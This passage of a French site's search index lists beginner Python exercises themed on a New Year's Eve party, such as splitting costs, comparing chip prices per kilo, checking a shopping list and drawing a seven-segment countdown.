{\"nom\": \"Alice\", \"age\": 25, \"affinites\": [\"Bob\", \"Charlie\"], \"incompatibilites\": [\"Eve\"]},\n    {\"nom\": \"Bob\", \"age\": 28, \"affinites\": [\"Alice\", \"Diana\"], \"incompatibilites\": []},\n    {\"nom\": \"Charlie\", \"age\": 22, \"affinites\": [\"Alice\", \"Frank\"], \"incompatibilites\": [\"Grace\"]},\n    {\"nom\": \"Diana\", \"age\": 30, \"affinites\": [\"Bob\", \"Eve\"], \"incompatibilites\": []},\n    {\"nom\": \"Eve\", \"age\": 26, \"affinites\": [\"Diana\", \"Frank\"], \"incompatibilites\": [\"Alice\"]},\n    {\"nom\": \"Frank\", \"age\": 29, \"affinites\": [\"Charlie\", \"Eve\"], \"incompatibilites\": []},\n    {\"nom\": \"Grace\", \"age\": 24, \"affinites\": [\"Henry\"], \"incompatibilites\": [\"Charlie\"]},\n    {\"nom\": \"Henry\", \"age\": 27, \"affinites\": [\"Grace\"], \"incompatibilites\": []}\n]\n\nplaces_par_table = 4\n</code></pre>"},{"location":"premiere/New_Year_Advent/Exercices_2025_J1-J9/Jour_4/#exercice-principal","title":"Exercice Principal","text":"<p>Nombre de tables n\u00e9cessaires</p> <p>\u00c9crire une fonction <code>nombre_tables</code> qui prend en param\u00e8tre le nombre d'invit\u00e9s et le nombre de places par table, et renvoie le nombre minimum de tables n\u00e9cessaires.</p> <p>Utiliser la division enti\u00e8re et g\u00e9rer le cas o\u00f9 il reste des places.</p> <p>V\u00e9rifier compatibilit\u00e9</p> <p>\u00c9crire une fonction <code>verifier_compatibilite</code> qui prend en param\u00e8tre deux noms d'invit\u00e9s et la liste des invit\u00e9s, et renvoie True si les deux personnes peuvent \u00eatre \u00e0 la m\u00eame table.</p> <p>Deux personnes sont compatibles si aucune des deux n'a l'autre dans sa liste d'incompatibilit\u00e9s.</p> <p>Affinit\u00e9s communes</p> <p>\u00c9crire une fonction <code>affinites_communes</code> qui prend en param\u00e8tre une liste de noms d'invit\u00e9s (une table) et la liste compl\u00e8te des invit\u00e9s, et renvoie le nombre total d'affinit\u00e9s satisfaites \u00e0 cette table.</p> <p>Une affinit\u00e9 est satisfaite quand deux personnes qui s'appr\u00e9cient sont \u00e0 la m\u00eame table. Attention \u00e0 ne pas compter deux fois la m\u00eame affinit\u00e9 (A appr\u00e9cie B = B appr\u00e9cie A).</p> <p>Pour valider cet exercice, vous devrez rendre \u00e0 votre enseignant les trois fonctions ainsi qu'un exemple d'utilisation avec les donn\u00e9es fournies.</p>"},{"location":"premiere/New_Year_Advent/Exercices_2025_J10-J14/Jour_10/","title":"Jour 10 \ud83c\udf89\ud83e\udd8a\ud83c\udf89 : Bilan financier","text":"<p>Apr\u00e8s la soir\u00e9e, il faut faire le bilan financier complet. Qui a pay\u00e9 quoi, qui doit de l'argent \u00e0 qui, et comment \u00e9quilibrer les comptes de mani\u00e8re optimale.</p> <p>Sophie doit calculer les remboursements n\u00e9cessaires entre tous les participants.</p>"},{"location":"premiere/New_Year_Advent/Exercices_2025_J10-J14/Jour_10/#informations-necessaires","title":"Informations n\u00e9cessaires","text":"<p>On consid\u00e8re : - Une d\u00e9pense est repr\u00e9sent\u00e9e par un dictionnaire contenant :   - description (str)   - montant (float)   - pay\u00e9_par (str)   - beneficiaires (list) : liste des noms des personnes qui b\u00e9n\u00e9ficient de cette d\u00e9pense</p> <pre><code>depenses = [\n    {\"description\": \"Courses alimentaires\", \"montant\": 180.50, \"pay\u00e9_par\": \"Sophie\", \"beneficiaires\": [\"Sophie\", \"Marc\", \"Julie\", \"Pierre\", \"Anna\"]},\n    {\"description\": \"Boissons\", \"montant\": 95.30, \"pay\u00e9_par\": \"Marc\", \"beneficiaires\": [\"Sophie\", \"Marc\", \"Julie\", \"Pierre\", \"Anna\"]},\n    {\"description\": \"D\u00e9coration\", \"montant\": 45.20, \"pay\u00e9_par\": \"Julie\", \"beneficiaires\": [\"Sophie\", \"Marc\", \"Julie\", \"Pierre\", \"Anna\"]},\n    {\"description\": \"Taxi Pierre\", \"montant\": 25.00, \"pay\u00e9_par\": \"Sophie\", \"beneficiaires\": [\"Pierre\"]},\n    {\"description\": \"Taxi Anna\", \"montant\": 30.00, \"pay\u00e9_par\": \"Marc\", \"beneficiaires\": [\"Anna\"]},\n    {\"description\": \"Musique streaming\", \"montant\": 12.99, \"pay\u00e9_par\": \"Julie\", \"beneficiaires\": [\"Sophie\", \"Marc\", \"Julie\", \"Pierre\", \"Anna\"]},\n    {\"description\": \"Nettoyage\", \"montant\": 80.00, \"pay\u00e9_par\": \"Anna\", \"beneficiaires\": [\"Sophie\", \"Marc\", \"Julie\", \"Pierre\", \"Anna\"]}\n]\n\nparticipants = [\"Sophie\", \"Marc\", \"Julie\", \"Pierre\", \"Anna\"]\n</code></pre>"},{"location":"premiere/New_Year_Advent/Exercices_2025_J10-J14/Jour_10/#exercice-principal","title":"Exercice Principal","text":"<p>Calcul de la part individuelle</p> <p>\u00c9crire une fonction <code>part_individuelle_depense</code> qui prend en param\u00e8tre une d\u00e9pense et renvoie le montant que chaque b\u00e9n\u00e9ficiaire doit pour cette d\u00e9pense.</p> <p>Le montant doit \u00eatre r\u00e9parti \u00e9quitablement entre tous les b\u00e9n\u00e9ficiaires. Arrondir \u00e0 2 d\u00e9cimales.</p> <p>Total pay\u00e9 par personne</p> <p>\u00c9crire une fonction <code>total_paye_par_personne</code> qui prend en param\u00e8tre une liste de d\u00e9penses et un nom de personne, et renvoie le montant total que cette personne a pay\u00e9.</p> <p>Additionner tous les montants des d\u00e9penses pay\u00e9es par cette personne.</p> <p>Total d\u00fb par personne</p> <p>\u00c9crire une fonction <code>total_du_par_personne</code> qui prend en param\u00e8tre une liste de d\u00e9penses et un nom de personne, et renvoie le montant total que cette personne doit.</p> <p>Pour chaque d\u00e9pense o\u00f9 la personne est b\u00e9n\u00e9ficiaire, ajouter sa part (utiliser la premi\u00e8re fonction). Arrondir \u00e0 2 d\u00e9cimales.</p> <p>Bilan par personne</p> <p>\u00c9crire une fonction <code>bilan_par_personne</code> qui prend en param\u00e8tre une liste de d\u00e9penses et un nom de personne, et renvoie le solde de cette personne (positif si elle doit recevoir, n\u00e9gatif si elle doit payer).</p> <p>Solde = Total pay\u00e9 - Total d\u00fb Arrondir \u00e0 2 d\u00e9cimales.</p> <p>Pour valider cet exercice, vous devrez rendre \u00e0 votre enseignant les quatre fonctions ainsi qu'un exemple d'utilisation montrant le bilan de chaque participant.</p>"},{"location":"premiere/New_Year_Advent/Exercices_J1-J9/Jour_1/","title":"Jour 1 \ud83e\udd8a\u2744\ufe0f\ud83c\udf89 : Calculer le prix des courses du R\u00e9veillon","text":"<p>Le r\u00e9veillon du Nouvel An est une f\u00eate g\u00e9n\u00e9ralement partag\u00e9e en famille ou entre amis.</p> <p>Une organisation g\u00e9n\u00e9ralement propos\u00e9e est de partager les frais pour \u00e9viter que tout le monde ram\u00e8ne des denr\u00e9es et limiter les doublons ou le g\u00e2chis.</p> <p>Vous pr\u00e9parez votre soir\u00e9e du nouvel an et pr\u00e9voyez d'inviter 20 personnes.</p> <p>Le probl\u00e8me est que la machine qui sort le ticket de caisse est tomb\u00e9e en panne \u00e0 l'\u00e9dition du ticket et que l'on ne peut pas voir le prix total du ticket.</p>"},{"location":"premiere/New_Year_Advent/Exercices_J1-J9/Jour_1/#informations-necessaires","title":"Informations n\u00e9cessaires","text":"<p>On consid\u00e8re un ticket de caisse mod\u00e9lis\u00e9 sous la forme d'une liste Python et le nombre d'invit\u00e9s un nombre entier (\u00e9videmment un personne ne peut pas \u00eatre divis\u00e9e). Ce ticket de caisse retrace pour chaque article leur prix. On consid\u00e8re uniquement les prix totaux, on ne consid\u00e8re pas la quantit\u00e9 de produits.</p>"},{"location":"premiere/New_Year_Advent/Exercices_J1-J9/Jour_1/#exercice-principal","title":"Exercice Principal","text":"<p>On aimerait savoir quelle somme va d\u00e9penser chacun des participant \u00e0 la petite f\u00eate pour qu'ils puissent anticiper le remboursement de l'h\u00f4te qui a avanc\u00e9 les frais.</p> <p>Somme totale du ticket</p> <p>\u00c9crire une fonction <code>somme_totale_ticket</code> qui prend en param\u00e8tre un ticket de caisse et renvoie la somme totale des articles.</p> <p>Rappel : Le ticket correspond \u00e0 une liste de <code>float</code>.</p> <p>Essayer la fonction avec le ticket de caisse suivant :</p> <pre><code>    ticket_caisse = [\n    12.99, 8.49, 4.59, 15.89, 3.99, 7.49, 19.99, 2.59, 9.99, 5.79,\n    13.49, 4.79, 6.99, 11.59, 8.79, 14.49, 3.69, 7.99, 10.49, 2.79,\n    5.99, 16.89, 9.49, 6.79, 12.59, 4.29, 3.89, 10.99, 8.59, 15.99,\n    7.89, 9.79, 6.39, 13.99, 4.69, 11.99, 14.59, 3.79, 10.79, 5.89,\n    8.39, 16.49, 7.59, 12.89, 9.39, 4.59, 5.49, 13.59, 6.89, 8.99\n    ]\n</code></pre> <p>Maintenant que nous connaissons le prix global du ticket, on voudrait savoir quelle est la participation de chacun des invit\u00e9s de la soir\u00e9e.</p> <p>Participation des invit\u00e9s</p> <p>\u00c9crire une fonction <code>participation_des_invites</code> qui prend en param\u00e8tre un ticket de caisse et un nombre d'invit\u00e9s et renvoie la participation de chaque invit\u00e9.</p> <p>Indication : Cette fonction devra utiliser la fonction pr\u00e9c\u00e9dente.</p> <p>Pour valider cet exercice, vous devrez rendre \u00e0 votre enseignant les fonctions construites ainsi que la somme que chaque invit\u00e9 doit payer.</p>"},{"location":"premiere/New_Year_Advent/Exercices_J1-J9/Jour_2/","title":"Jour 2 \ud83e\udd8a\u2744\ufe0f\ud83c\udf89 : Calculer le prix de chaque cat\u00e9gories des articles pour la soir\u00e9e","text":"<p>Suzanne, une des invit\u00e9es cherche \u00e0 quantifier les prix des produits achet\u00e9s pour la soir\u00e9e du r\u00e9veillon.</p> <p>Le magasin dans lequel les courses ont \u00e9t\u00e9 faites donne des tickets o\u00f9 les articles sont tri\u00e9s par cat\u00e9gorie mais aucun sous-total n'est indiqu\u00e9. Exemple : Boulangerie-P\u00e2tisserie, Poissonnerie, Boissons, Boucherie, Nourriture sal\u00e9e, Nourriture sucr\u00e9e.</p>"},{"location":"premiere/New_Year_Advent/Exercices_J1-J9/Jour_2/#informations-necessaires","title":"Informations n\u00e9cessaires","text":"<p>On consid\u00e8re donc qu'un article est repr\u00e9sent\u00e9 par son prix (float) qu'une cat\u00e9gorie d'articles est une liste et que le ticket de caisse est une liste de cat\u00e9gories d'articles.</p>"},{"location":"premiere/New_Year_Advent/Exercices_J1-J9/Jour_2/#exercice-principal","title":"Exercice Principal","text":"<p>On aimerait savoir combien a co\u00fbt\u00e9 chacunes des cat\u00e9gories d'articles pour quantifier o\u00f9 \u00e9taient les plus gros p\u00f4les de d\u00e9penses.</p> <p>Le ticket de caisse est de la forme :</p> <pre><code>    ticket_de_caisse = [\n                        [articles de la poissonnerie], \n                        [articles de la boucherie-venaison],\n                        [articles de la boulangerie-patisserie], \n                        [articles de l epicerie salee], \n                        [articles de l epicerie surcree ], \n                        [articles du rayon boisson]\n                       ]\n</code></pre> <p>Somme des cat\u00e9gories</p> <p>\u00c9crire une fonction <code>somme_categories</code> qui prend en param\u00e8tre un ticket de caisse et renvoie une liste de <code>float</code> correspondant aux prix de chaque cat\u00e9gories.</p> <p>Rappel :  - Un article est repr\u00e9sent\u00e9 par son prix <code>float</code>. - Une cat\u00e9gorie est une liste de <code>float</code> - Le ticket correspond \u00e0 une liste de liste de <code>float</code>. - On fournit une liste avec les noms des cat\u00e9gories o\u00f9 l'indice correspondant au nom est le m\u00eame dans la liste. <pre><code>    &gt;&gt;&gt; print(categories[0], ticket_de_caisse[0])\n    \"Poissonnerie\",[12.99, 8.49, 15.89, 3.99, 19.99, 2.59]\n</code></pre></p> <p>Essayer la fonction avec le ticket de caisse suivant :</p> <pre><code>    categories = [\"Poissonnerie\",\"Boucherie-Venaison\", \"Boulangerie-P\u00e2tisserie\", \"\u00c9picerie sal\u00e9e\", \"\u00c9picerie sucr\u00e9e\", \"Boissons\"]\n    ticket_de_caisse = [\n                        [12.99, 8.49, 15.89, 3.99, 19.99, 2.59], \n                        [13.49, 6.99, 11.59, 8.79, 14.49, 3.69, 7.99],  \n                        [4.59, 5.79, 4.79, 7.49, 6.79, 5.99], \n                        [16.89, 9.49, 12.59, 4.29, 3.89, 15.99],\n                        [9.79, 6.39, 13.99, 4.69, 11.99, 8.59],\n                        [14.59, 3.79, 10.79, 5.89, 16.49, 7.59, 12.89, 9.39, 8.99]\n                    ]\n</code></pre> <p>Maintenant que nous connaissons le prix de chaque cat\u00e9gorie, on a besoin de savoir quels ont \u00e9t\u00e9 les p\u00f4les de d\u00e9penses. On consid\u00e8re qu'un p\u00f4le de d\u00e9pense est co\u00fbteux si elle a co\u00fbt\u00e9 plus de 60\u20ac.</p> <p>Participation des invit\u00e9s</p> <p>\u00c9crire une fonction <code>poles_couteux</code> qui prend en param\u00e8tre un ticket de caisse (<code>list[list[float]]</code>), la liste des cat\u00e9gories (<code>list[str]</code>), un seuil (<code>int</code>) et renvoie les cat\u00e9gories co\u00fbteuses sous la forme d'une liste de tuples (categorie_couteuse, prix_total).</p> <p>Indication : Cette fonction devra utiliser la fonction pr\u00e9c\u00e9dente.</p> <p>Pour valider cet exercice, vous devrez rendre \u00e0 votre enseignant les fonctions construites ainsi que les p\u00f4les de d\u00e9penses co\u00fbteux.</p>"},{"location":"premiere/New_Year_Advent/Exercices_J1-J9/Jour_3/","title":"Jour 3 \ud83e\udd8a\u2744\ufe0f\ud83c\udf89 : Pas de bol, il manque des chips","text":"<p>L'organisateur de la soir\u00e9e, Jean, se rend compte qu'il n'y aura pas assez de chips pour tout le monde malgr\u00e9 sa liste de courses bien d\u00e9taill\u00e9e.</p> <p>Il se rend donc dans son supermarch\u00e9 pr\u00e9f\u00e9r\u00e9 Intramarch\u00e9, pour acheter ses paquets de chips. Cependant, il se dit qu'importe la marque et le go\u00fbt, il doit acheter le plus de chips possibles pour satisfaire tous les convives.</p> <p>Il se rend donc dans le rayon et se rend compte qu'il y a beaucoup de chips, plus qu'il n'a jamais vu auparavant.</p> <p>Il se demande donc quel paquet de chips prendre car il a un budget de 25\u20ac.</p>"},{"location":"premiere/New_Year_Advent/Exercices_J1-J9/Jour_3/#informations-necessaires","title":"Informations n\u00e9cessaires","text":"<p>On consid\u00e8re un paquet de chips comme \u00e9tant un tuple tel que : paquet_de_chips = (marque, poids, prix). Il existe plusieurs mani\u00e8res de choisir quelles chips prendre et on s'interessera \u00e0 un choix particulier : le prix minimum.</p>"},{"location":"premiere/New_Year_Advent/Exercices_J1-J9/Jour_3/#exercice-principal","title":"Exercice Principal","text":"<p>On aimerait savoir combien de paquet de chips, Jean, peut acheter.</p> <p>Un paquet de chips est de la forme</p> <pre><code>    ticket_de_caisse = (marque, poids, prix)\n\n    #Exemple\n    paquet_chips_1 = (\"Vica\", 0.150, 1.99)\n    paquet_chips_2 = (\"Leys\", 0.200, 2.49)\n</code></pre> <p>Quel paquet de chips prendre?</p> <p>\u00c9crire une fonction <code>paquet_de_prix_minimal</code> qui prend en param\u00e8tre une liste de paquets de chips et renvoie le nom du paquet de chips le moins cher.</p> <p>Rappel :  Un paquet de chips est de la forme</p> <pre><code>    ticket_de_caisse = (marque, poids, prix)\n\n    #Exemple\n    paquet_chips_1 = (\"Vica\", 0.150, 1.99)\n    paquet_chips_2 = (\"Leys\", 0.200, 2.49)\n</code></pre> <p>Essayer la fonction avec les paquets de chips suivants :</p> <pre><code>    paquet_chips_1 = (\"Chipeur\", 0.150, 1.99)\n    paquet_chips_2 = (\"Frites et Cie\", 0.200, 2.49)\n    paquet_chips_3 = (\"Pipoles\", 0.200, 2.79)\n    paquet_chips_4 = (\"Tay's\", 0.300, 3.19)\n    paquet_chips_5 = (\"Bonne Patate\", 0.125, 1.69)\n    paquet_chips_6 = (\"Cuisto's\", 0.100, 1.49)\n    paquet_chips_7 = (\"Mik'O Chips\", 0.250, 2.59)\n\n    paquets_de_chips = [paquet_chips_1, paquet_chips_2, paquet_chips_3, paquet_chips_4, paquet_chips_5, paquet_chips_6, paquet_chips_7]\n</code></pre> <p>\u00c9crire une fonction <code>nombre_paquets_chips</code> qui prend en param\u00e8tre un paquet de chips (<code>tuple(str,float,float)</code>) et un budget (<code>int</code>) et renvoie combien de paquet de chips on peut acheter avec le budget pass\u00e9 en param\u00e8tre.</p> <p>Pour valider cet exercice, vous devrez rendre \u00e0 votre enseignant les fonctions construites ainsi que le nombre de paquet de chips possible d'acheter.</p>"},{"location":"premiere/New_Year_Advent/Exercices_J1-J9/Jour_4/","title":"Jour 4 \ud83e\udd8a\u2744\ufe0f\ud83c\udf89 : une soir\u00e9e de gloutons de chips","text":"<p>Jean, avec son pr\u00e9c\u00e9dent calcul s'est rendu compte qu'il n'avait peut-\u00eatre pas fait le bon choix car \u00e0 prendre les chips les moins ch\u00e8res, il a omis une information capitale quand on fait ses courses : Le prix au kilo. En prenant les chips les moins ch\u00e8res, il se rend compte qu'elles n'ont pas le prix au kilo le moins cher. Par cons\u00e9quent, celles-ci ne sont pas les plus optimales \u00e0 acheter pour en avoir le plus gros volume.</p>"},{"location":"premiere/New_Year_Advent/Exercices_J1-J9/Jour_4/#informations-necessaires","title":"Informations n\u00e9cessaires","text":"<p>On consid\u00e8re un paquet de chips comme \u00e9tant un tuple tel que : paquet_de_chips = (marque, poids, prix). On prendra compte de la m\u00e9thode suivante : pour chercher le nombre optimal de paquet de chips, on consid\u00e8re le prix au kilo.</p>"},{"location":"premiere/New_Year_Advent/Exercices_J1-J9/Jour_4/#exercice-principal","title":"Exercice Principal","text":"<p>On aimerait savoir combien de paquet de chips, Jean, peut acheter.</p> <p>Un paquet de chips est de la forme :</p> <pre><code>    ticket_de_caisse = (marque, poids, prix)\n\n    #Exemple\n    paquet_chips_1 = (\"Vica\", 0.150, 1.99)\n    paquet_chips_2 = (\"Leys\", 0.200, 2.49)\n</code></pre> <p>On consid\u00e8re les paquets de chips suivants :</p> <pre><code>paquet_chips_1 = (\"Chipeur\", 0.150, 1.99)\npaquet_chips_2 = (\"Frites et Cie\", 0.200, 2.49)\npaquet_chips_3 = (\"Pipoles\", 0.200, 2.79)\npaquet_chips_4 = (\"Tay's\", 0.300, 3.19)\npaquet_chips_5 = (\"Bonne Patate\", 0.125, 1.69)\npaquet_chips_6 = (\"Cuisto's\", 0.100, 1.49)\npaquet_chips_7 = (\"Mik'O Chips\", 0.250, 2.59)\n\npaquets_de_chips = [paquet_chips_1, paquet_chips_2, paquet_chips_3, paquet_chips_4, paquet_chips_5, paquet_chips_6, paquet_chips_7]\n</code></pre> <p>Prix au kilo</p> <p>On va chercher \u00e0 calculer le prix au kilo pour chacun des paquets de chips.</p> <p>Comme un tuple est non mutable, c'est \u00e0 dire qu'on ne peut en modifier le contenu, on va recr\u00e9er une liste de tuples avec les bonnes informations.</p> <p>Au retour de cette fonction, un paquet de chips sera une liste de 4 \u00e9l\u00e9ments : <code>paquet_chips_1 = [\"Chipeur\", 0.150, 1.99, 13.27]</code>.</p> <p>\u00c9crire une fonction <code>prix_kilo</code> qui prend en param\u00e8tre une liste de paquets de chips et renvoie une nouvelle liste contenant des paquets de chips associ\u00e9s \u00e0 leur prix au kilo.</p> <p>Paquet ayant le prix au kilo le plus petit</p> <p>Maintenant que nous connaissons le prix au kilo de tous les paquets de chips, on va chercher \u00e0 savoir quel paquet \u00e0 le prix au kilo le plus petit.</p> <p>\u00c9crire une fonction <code>paquet_prix_kilo_min</code> qui prend en param\u00e8tre une liste de paquets de chips et renvoie le paquet avec le prix au kilo minimum.</p> <p>Indication : Cette fonction utilisera la fonction pr\u00e9c\u00e9dente.</p> <p>Combien de paquet peut-on acheter?</p> <p>On sait maintenant gr\u00e2ce \u00e0 la fonction pr\u00e9c\u00e9dente quel paquet de chips a le co\u00fbt au kilo le plus faible. On va donc chercher \u00e0 savoir combien de paquet on peut acheter et combien en poids cela correspond.</p> <p>\u00c9crire une fonction <code>paquets_budget</code> qui prend en param\u00e8tre une liste de paquets de chips et un budget \u00e0 ne pas d\u00e9passer (int) et renvoie le nombre de paquets de chips possible d'acheter et la masse totale de chips obtenue.</p> <p>Indication : Cette fonction utilisera la fonction pr\u00e9c\u00e9dente.</p> <pre><code>#Rappel : lorsqu'une fonction renvoie plusieurs valeurs, elle renvoie un tuple de ces plusieurs valeurs.\n\ndef ma_super_fonction(param1:type,; param2:type)-&gt;tuple:\n    var1 = x\n    var2 = y\n\n    return var1, var2\n</code></pre> <p>Pour valider cet exercice, vous devrez rendre \u00e0 votre enseignant les fonctions construites ainsi que le nombre de paquet de chips possible d'acheter ainsi que la masse totale de chips obtenue.</p>"},{"location":"premiere/New_Year_Advent/Exercices_J1-J9/Jour_5/","title":"Jour 5 \ud83e\udd8a\u2744\ufe0f\ud83c\udf89 : O\u00f9 est pass\u00e9e la liste de courses ?","text":"<p>Jean rentre des courses et re\u00e7oit un message de sa compagne qui lui demande s'il a bien pens\u00e9 \u00e0 acheter tous les articles de la liste qu'elle lui avait pr\u00e9par\u00e9e. Le probl\u00e8me est que Jean a perdu la liste de courses en faisant les rayons ! Heureusement, il a gard\u00e9 son ticket de caisse.</p> <p>Sa compagne lui renvoie par message les articles qu'il devait acheter, et Jean doit maintenant v\u00e9rifier s'il a bien tout achet\u00e9 pour la soir\u00e9e du r\u00e9veillon.</p>"},{"location":"premiere/New_Year_Advent/Exercices_J1-J9/Jour_5/#informations-necessaires","title":"Informations n\u00e9cessaires","text":"<p>On consid\u00e8re : - Un article est repr\u00e9sent\u00e9 par un tuple contenant le nom de l'article et son prix : <code>(str, float)</code> - Le ticket de caisse est une liste d'articles - La liste de courses est une liste de noms d'articles (<code>str</code>)</p>"},{"location":"premiere/New_Year_Advent/Exercices_J1-J9/Jour_5/#exercice-principal","title":"Exercice Principal","text":"<p>Recherche d'un article</p> <p>\u00c9crire une fonction <code>chercher_article</code> qui prend en param\u00e8tre un ticket de caisse et le nom d'un article et renvoie un tuple <code>(bool, float)</code> indiquant si l'article est pr\u00e9sent et son prix.</p> <p>Rappel :  - Le nom des articles doit \u00eatre compar\u00e9 sans tenir compte de la casse (majuscules/minuscules) - Si l'article n'est pas trouv\u00e9, la fonction renvoie <code>(False, 0.0)</code></p> <p>Essayer la fonction avec le ticket de caisse suivant :</p> <pre><code>ticket_de_caisse = [\n    (\"foie gras\", 19.99),\n    (\"saumon fum\u00e9\", 15.50),\n    (\"champagne\", 35.99),\n    (\"hu\u00eetres\", 22.90),\n    (\"b\u00fbche glac\u00e9e\", 12.99),\n    (\"pain surprise\", 8.99),\n    (\"chocolats\", 7.50),\n    (\"crevettes\", 13.99),\n    (\"toasts\", 3.99),\n    (\"biscuits ap\u00e9ritif\", 5.49)\n]\n</code></pre> <p>Articles manquants</p> <p>\u00c9crire une fonction <code>articles_manquants</code> qui prend en param\u00e8tre un ticket de caisse et une liste de courses et renvoie la liste des articles qui n'ont pas \u00e9t\u00e9 achet\u00e9s.</p> <p>Indication : Cette fonction devra utiliser la fonction pr\u00e9c\u00e9dente.</p> <p>Essayer la fonction avec la liste de courses suivante : <pre><code>liste_de_courses = [\n        \"foie gras\",\n        \"champagne\",\n        \"chocolats\",\n        \"caviar\",\n        \"hu\u00eetres\",\n        \"saucisson\"]\n</code></pre></p> <p>Articles achet\u00e9s</p> <p>\u00c9crire une fonction <code>articles_non_achetes</code> qui prend en param\u00e8tre un ticket de caisse et une liste de courses et renvoie une liste de tuples <code>(article, prix)</code> correspondant aux articles de la liste qui n'ont pas \u00e9t\u00e9 achet\u00e9s.</p> <p>Indication : Cette fonction devra utiliser la premi\u00e8re fonction.</p> <p>Pour valider cet exercice, vous devrez rendre \u00e0 votre enseignant les fonctions construites ainsi que la liste des articles manquants et la liste des articles achet\u00e9s avec leur prix pour la liste de courses fournie.</p>"},{"location":"premiere/New_Year_Advent/Exercices_J1-J9/Jour_6/","title":"Jour 6 \ud83e\udd8a\ud83d\udc3c\u2744\ufe0f\ud83c\udf89 : Le compte \u00e0 rebours jusqu'\u00e0 minuit","text":"<p>Pour le r\u00e9veillon, Jean veut cr\u00e9er une ambiance festive en projetant un compte \u00e0 rebours avant minuit. N'ayant pas de mat\u00e9riel d'affichage particulier, il d\u00e9cide de cr\u00e9er un affichage num\u00e9rique en Python qui simule un afficheur 7 segments, comme ceux que l'on trouve sur les r\u00e9veils digitaux.</p>"},{"location":"premiere/New_Year_Advent/Exercices_J1-J9/Jour_6/#informations-necessaires","title":"Informations n\u00e9cessaires","text":"<p>Un afficheur 7 segments est compos\u00e9 de 7 segments (nomm\u00e9s de a \u00e0 g) qui peuvent \u00eatre allum\u00e9s ou \u00e9teints pour former des chiffres :</p> <pre><code>         aaaa\n        f    b\n        f    b\n         gggg\n        e    c\n        e    c\n         dddd\n</code></pre> <p>Chaque segment peut \u00eatre activ\u00e9 ou d\u00e9sactiv\u00e9 en fonction du chiffre \u00e0 afficher. On indique qu'un segment activ\u00e9 est repr\u00e9sent\u00e9 par le bool\u00e9en <code>True</code> et d\u00e9sactiv\u00e9 par le <code>False</code>. On utilise le dictionnaire suivant pour repr\u00e9senter l'\u00e9tat des segments pour chaque chiffre :</p> <p>Segments des chiffres</p> <p>Donner le dictionnaire qui associe chaque chiffre aux segments en pr\u00e9cisant s'il est allum\u00e9 ou \u00e9teint.</p> <p>Exemple: <pre><code>    ... \n    0: {\"a\": True, \"b\": True, \"c\": True, \"d\": True, \"e\": True, \"f\": True, \"g\": False},\n    1: {\"a\": False, \"b\": True, \"c\": True, \"d\": False, \"e\": False, \"f\": False, \"g\": False}\n    ...\n</code></pre></p>"},{"location":"premiere/New_Year_Advent/Exercices_J1-J9/Jour_6/#exercice-principal","title":"Exercice principal","text":""},{"location":"premiere/New_Year_Advent/Exercices_J1-J9/Jour_6/#1-representation-dun-chiffre","title":"1. Repr\u00e9sentation d'un chiffre","text":"<p>Afficher un chiffre</p> <p>\u00c9crire une fonction afficher_chiffre_bool qui prend en param\u00e8tre un chiffre et affiche sa repr\u00e9sentation \u00e0 l\u2019\u00e9cran.</p> <p>Pour chaque segment : - Si le segment est activ\u00e9 (True), afficher * - Si le segment est d\u00e9sactiv\u00e9 (False), afficher un espace ( )</p> <p>Exemple d\u2019affichage pour le chiffre 5 : <pre><code>***\n*   \n*   \n***\n    *\n    *\n***\n</code></pre></p> <p>Indication : pseudo_code</p> <pre><code>fonction afficher_chiffre_bool(chiffre):\n    initialiser une cha\u00eene vide \"representation\"\n\n    si le segment a est activ\u00e9 :\n        ajouter \" *** \\n\" \u00e0 \"representation\"\n    sinon :\n        ajouter \"     \\n\" \u00e0 \"representation\"\n\n    pour chaque ligne des segments f et b (haut gauche et haut droite) :\n        si le segment f est activ\u00e9 :\n            ajouter \"*\" \u00e0 \"representation\"\n        sinon :\n            ajouter \" \" \u00e0 \"representation\"\n\n        ajouter \"   \" \u00e0 \"representation\"\n\n        si le segment b est activ\u00e9 :\n            ajouter \"*\\n\" \u00e0 \"representation\"\n        sinon :\n            ajouter \" \\n\" \u00e0 \"representation\"\n\n    si le segment g est activ\u00e9 :\n        ajouter \" *** \\n\" \u00e0 \"representation\"\n    sinon :\n        ajouter \"     \\n\" \u00e0 \"representation\"\n\n    pour chaque ligne des segments e et c (bas gauche et bas droite) :\n        si le segment e est activ\u00e9 :\n            ajouter \"*\" \u00e0 \"representation\"\n        sinon :\n            ajouter \" \" \u00e0 \"representation\"\n\n        ajouter \"   \" \u00e0 \"representation\"\n\n        si le segment c est activ\u00e9 :\n            ajouter \"*\\n\" \u00e0 \"representation\"\n        sinon :\n            ajouter \" \\n\" \u00e0 \"representation\"\n\n    si le segment d est activ\u00e9 :\n        ajouter \" *** \\n\" \u00e0 \"representation\"\n    sinon :\n        ajouter \"     \\n\" \u00e0 \"representation\"\n\n    retourner \"representation\"\n</code></pre>"},{"location":"premiere/New_Year_Advent/Exercices_J1-J9/Jour_6/#2-compte-a-rebours","title":"2. Compte \u00e0 rebours","text":"<p>Compte \u00e0 rebours</p> <p>\u00c9crire une fonction compte_a_rebours qui prend en param\u00e8tre un nombre de d\u00e9part et affiche le d\u00e9compte jusqu\u2019\u00e0 0. La fonction devra : - Utiliser afficher_chiffre_bool pour afficher chaque chiffre. - Attendre une seconde entre chaque chiffre. - Effacer l\u2019\u00e9cran avant d\u2019afficher le chiffre suivant.</p> <p>Indication : vous utiliserez le module time <code>import time</code> pour r\u00e9aliser une pause de 1 seconde entre chaque affichage de chiffre. Vous utiliserez la fonction <code>time.sleep(nombre_de_secondes).</code></p> <p>Pour valider cet exercice, vous devrez rendre les fonctions construites ainsi qu\u2019une capture d\u2019\u00e9cran du compte \u00e0 rebours en action.</p>"},{"location":"premiere/New_Year_Advent/Exercices_J1-J9/Jour_7/","title":"Jour 7 \ud83e\udd8a\u2744\ufe0f\ud83c\udf89 : Composer le menu du R\u00e9veillon","text":"<p>Jean et ses amis ont d\u00e9cid\u00e9 de faire appel \u00e0 un traiteur pour le r\u00e9veillon. Le traiteur leur a fourni une liste de plats possibles avec leurs prix. Cependant, certains invit\u00e9s ont des restrictions alimentaires (v\u00e9g\u00e9tarien, sans gluten...) et Jean doit s'assurer que tout le monde pourra manger.</p>"},{"location":"premiere/New_Year_Advent/Exercices_J1-J9/Jour_7/#informations-necessaires","title":"Informations n\u00e9cessaires","text":"<p>Le traiteur fournit un catalogue sous forme de dictionnaire : <pre><code>catalogue_traiteur = {\n    \"entrees\": [\n        {\"nom\": \"Foie gras maison\", \"prix\": 15, \"restrictions\": [\"v\u00e9g\u00e9tarien\"]},\n        {\"nom\": \"Salade de quinoa\", \"prix\": 8, \"restrictions\": []},\n        {\"nom\": 